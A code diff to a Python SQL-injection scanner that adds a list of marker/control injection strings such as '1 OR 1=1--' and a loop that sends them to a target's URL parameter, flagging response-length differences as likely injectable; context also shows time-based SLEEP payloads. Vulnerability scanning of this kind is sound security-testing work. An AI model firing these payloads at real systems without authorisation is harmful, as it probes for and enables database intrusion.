@@ -39,6 +39,13 @@ ERROR_PAYLOADS = [
     ("char_bypass", "CHAR(39) OR 1=1--"),
 ]
 
+DIFF_PAYLOADS = [
+    ("or_true", "1 OR 1=1--", "1 AND 1=2--"),
+    ("or_true_alt", "1' OR '1'='1", "1' AND '1'='2"),
+    ("bool_gt", "1 AND 1<2--", "1 AND 1>2--"),
+    ("or_true_stmt", "1) OR (1=1--", "1) AND (1=2--"),
+]
+
 TIME_PAYLOADS = [
     ("sleep_mysql", "' AND SLEEP(5)--", "mysql"),
     ("sleep_mysql_3", "'; SELECT SLEEP(5)--", "mysql"),
@@ -379,6 +386,44 @@ async def sqli_detect(target: str, param: str = "") -> dict:
                             break
                     except Exception:
                         continue
+
+            # --- DIFFERENTIAL (BEHAVIORAL) SQLi: injection marker moves the response, control does not ---
+            for payload_name, marker_payload, control_payload in DIFF_PAYLOADS:
+                try:
+                    marker_url = f"{base}?{urllib.parse.urlencode({p: marker_payload})}"
+                    control_url = f"{base}?{urllib.parse.urlencode({p: control_payload})}"
+
+                    marker_resp = await client.get(marker_url)
+                    control_resp = await client.get(control_url)
+
+                    marker_len = len(marker_resp.text)
+                    control_len = len(control_resp.text)
+
+                    marker_delta = marker_len - baseline_len
+                    marker_ratio = marker_len / max(baseline_len, 1)
+                    control_delta = abs(control_len - baseline_len)
+
+                    # Injection marker returns a different response shape than
+                    # baseline while the benign-looking control stays baseline.
+                    behavioral = (marker_delta > 30 and marker_ratio > 1.15
+                                  and control_delta <= marker_delta / 2 and control_len <= baseline_len + 40)
+
+                    if behavioral:
+                        results.append({
+                            "technique": "differential",
+                            "param": p,
+                            "payload": payload_name,
+                            "marker_length": marker_len,
+                            "control_length": control_len,
+                            "baseline_length": baseline_len,
+                            "marker_delta": marker_delta,
+                            "control_delta": control_delta,
+                            "risk": "CRITICAL" if marker_ratio > 1.5 else "HIGH",
+                            "confidence": "high" if marker_ratio > 1.5 else "medium",
+                        })
+                        break
+                except Exception:
+                    continue
 
             # --- BOOLEAN-BASED BLIND SQLi ---
             for payload_name, true_payload, false_payload in BOOLEAN_PAYLOADS:
